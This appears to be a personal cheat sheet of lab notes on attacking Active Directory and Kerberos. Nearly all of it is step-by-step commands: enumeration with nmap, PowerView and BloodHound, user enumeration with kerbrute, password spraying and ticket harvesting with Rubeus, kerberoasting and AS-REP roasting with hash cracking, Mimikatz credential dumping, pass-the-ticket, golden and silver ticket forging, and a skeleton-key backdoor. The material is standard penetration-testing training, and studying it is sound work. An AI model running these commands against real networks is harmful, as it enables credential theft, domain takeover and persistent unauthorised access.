# 1-Enumeration

# Nmap
```bash
nmap -v -sC -sV
nmap -T4 -sV -A
nmap -p- -A -nP
```

# enum4linux 
``` bash
enum4linux -M + ip

enum4linux -a spookysec.local

```


# PowerView
1-
Start Powershell - 

```
powershell -ep bypass
```

 -ep bypasses the execution policy of powershell allowing you to easily run scripts
2-
Start PowerView
```
. .\Downloads\PowerView.ps1
```

3-
Enumerate the domain users
```
Get-NetUser | select cn
```
4-
Enumerate the domain groups
```
Get-NetGroup -GroupName *admin*
```
5-
```
cheatsheet to help you with commands: 

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993


```
Cheatsheet Credit: HarmJ0y
# Bloodhound
1-
BloodHound Installation 
```
apt-get install bloodhound
```

2-
`neo4j console` - default credentials -> neo4j:neo4j

3-

Getting loot w/ SharpHound -

	1.) `powershell -ep bypass` same as with PowerView
	
	
	2.) `. .\Downloads\SharpHound.ps1`    
	
	
	3.) `Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -
	ZipFileName loot.zip`
	
	4.) Transfer the loot.zip folder to your Attacker Machine
	
	note: you can use scp to transfer the file if you’re using ssh

4-
Mapping the network w/ BloodHound -
	
	1.) `bloodhound` Run this on your attacker machine not the victim machine
	
	2.) Sign In using the same credentials you set with Neo4j
	3.) Inside of Bloodhound search for this icon ![](
	https://i.imgur.com/rXgtiuK.png) and import the loot.zip folder

note: On some versions of BloodHound the import button does not work to get around this simply drag and drop the loot.zip folder into Bloodhound to import the .json files

	4.) To view the graphed network open the menu and select queries this will give 
	you a list of pre-compiled queries to choose from.

# Kerbrute 

1-
Kerbrute Installation - 
	
	1.) Download a precompiled binary for your OS - 
	[https://github.com/ropnop/kerbrute/releases](h
	ttps://github.com/ropnop/kerbrute/releases)[](h
	ttps://github.com/ropnop/kerbrute/releases)
	
	2.) Rename kerbrute_linux_amd64 to kerbrute
	
	3.) `chmod +x kerbrute` - make kerbrute executable

2-
Enumerating Users w/ Kerbrute -

	Enumerating users allows you to know which user accounts are on the target 
	domain and which accounts could potentially be used to access the network.
	
	1.) cd into the directory that you put Kerbrute
	
	2.) Download the wordlist to enumerate (SEMITRIC)
	
	3.) `./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt` - 
	This will brute force user accounts from a domain controller using a supplied 
	wordlist
```bash
./kerbrute_linux_amd64 userenum --dc <Ip_addr> -d <spookysec>.local userlist.txt
**ex to where find:=> ssl-cert:spookysec.local**
**the Output => USERNAME**


```

# Rubeus

1-
Harvesting Tickets w/ Rubeus - 

	Harvesting gathers tickets that are being transferred to the KDC and saves them 
	for use in other attacks such as the pass the ticket attack.
	
	1.) `cd Downloads` - navigate to the directory Rubeus is in
	
	2.) `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest 
	for TGTs every 30 seconds

2-
Brute-Forcing / Password-Spraying w/ Rubeus -

	Rubeus can both brute force passwords as well as password spray user accounts. 
	When brute-forcing passwords you use a single user account and a wordlist of 
	passwords to see which password works for that given user account. In password 
	spraying, you give a single password such as Password1 and "spray" against all 
	found user accounts in the domain to find which one may have that password.

	This attack will take a given Kerberos-based password and spray it against all 
	found users and give a .kirbi ticket. This ticket is a TGT that can be used in 
	order to get service tickets from the KDC as well as to be used in attacks like 
	the pass the ticket attack.

	Before password spraying with Rubeus, you need to add the domain controller 
	domain name to the windows host file. You can add the IP and domain name to the 
	hosts file from the machine by using the echo command: 
	
```
echo MACHINE_IP CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

	1.) `cd Downloads` - navigate to the directory Rubeus is in

	2.) `Rubeus.exe brute /password:Password1 /noticket` - 
	
This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user



# **2-Attacking Kerberos**

# Kerberoasting

			                           Method 1 - Rubeus
1-
Kerberoasting w/ Rubeus - 

	1.) `cd Downloads` - navigate to the directory Rubeus is in
	
	2.) `Rubeus.exe kerberoast` This will dump the Kerberos hash of any 
	kerberoastable users
	
	copy the hash onto your attacker machine and put it into a .txt file so we can 
	crack it with hashcat

	I have created a modified rockyou wordlist in order to speed up the process 
	download it 
	(https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt) 
	
	3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash

									Method 2 - Impacket

2-
Impacket Installation -

Impacket releases have been unstable since 0.9.20 
I suggest getting an installation of Impacket < 0.9.20

	1.) `cd /opt` navigate to your preferred directory to save tools in 
	
	2.) download the precompiled package 
	from [https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19]
	(https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)
	
	3.) `cd Impacket-0.9.19` navigate to the impacket directory
	
	4.) `pip install .` - this will install all needed dependencies
	
Kerberoasting w/ Impacket - 

	1.) `cd /usr/share/doc/python3-impacket/examples/` - navigate to where 
	GetUserSPNs.py is located
	
	2.) `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 
	MACHINE_IP -request` - this will dump the Kerberos hash for all kerberoastable 
	accounts it can find on the target domain just like Rubeus does; however, this 
	does not have to be on the targets machine and can be done remotely.
	
	3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash

```bash

wget https://github.com/fortra/impacket/releases/download/impacket_0_11_0/impacket-0.11.0.tar.gz && tar xvf impacket-0.11.0.tar.gz && cd impacket-0.11.0/examples/

```

``` bash


python3 GetNPUsers.py -dc-ip <IP> <spookysec>.local/<svc-admin> -no-pass


svc-admin => name of account from Output of Kerbrute


```


# AS-REP Roasting with Rubeus and Impacket

AS-REP Roasting Overview - 

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

Dumping KRBASREP5 Hashes w/ Rubeus -

	1.) `cd Downloads` - navigate to the directory Rubeus is in
	
	2.) `Rubeus.exe asreproast` - This will run the AS-REP roast command looking 
	for vulnerable users and then dump found vulnerable user hashes.

Crack those Hashes w/ hashcat - 
	
	1.) Transfer the hash from the target machine over to your attacker machine and 
	put the hash into a txt file
	
	2.) Insert 23$ after $krb5asrep$ so that the first line will be 
	$krb5asrep$23$User.....
	
	Use the same wordlist that you downloaded in task 4
	
	3.) `hashcat -m 18200 hash.txt Pass.txt` - crack those hashes! Rubeus AS-REP 
	Roasting uses hashcat mode 18200

# hashcat

``` bash
hashcat --hash-type 18200 --attack-mode 0 hash.txt passwordlist.txt


18200=> from search about typ of hash 

```

# john

```sh
john --wordlist=passwordlist.txt ASREProastables-john.txt
```

# ==evil-winrm==


# Mimikatz
Prepare Mimikatz & Dump Tickets - 

You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.


1.) `cd Downloads` - navigate to the directory mimikatz is in

2.) `mimikatz.exe` - run mimikatz

3.) `privilege::debug` - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
4.) `sekurlsa::tickets /export` - this will export all of the .kirbi tickets into the directory that you are currently in

At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier

Pass the Ticket w/ Mimikatz

Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.

1.) `kerberos::ptt <ticket>` - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
2.) `klist` - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.

We will not be using mimikatz for the rest of the attack.

3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.


# Golden/Silver Ticket Attack Overview 
1.) `cd downloads && mimikatz.exe` - navigate to the directory mimikatz is in and run mimikatz

2.) `privilege::debug` - ensure this outputs [privilege '20' ok]

﻿3.) `lsadump::lsa /inject /name:krbtgt` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
﻿
﻿**Create a Golden/Silver Ticket -** 

﻿1.) `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

I'll show you a demo of creating a golden ticket it is up to you to create a silver ticket.

**Use the Golden/Silver Ticket to access other machines -**

﻿1.) `misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.
2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
# Kerberos Backdoors w/ mimikatz
Installing the Skeleton Key w/ mimikatz -

1.) `misc::skeleton` - Yes! that's it but don't underestimate this small command it is very powerful
Accessing the forest - 

The default credentials will be: "_mimikatz_"  

example: `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

example: `dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.
# 112233


# 445566


# 778899


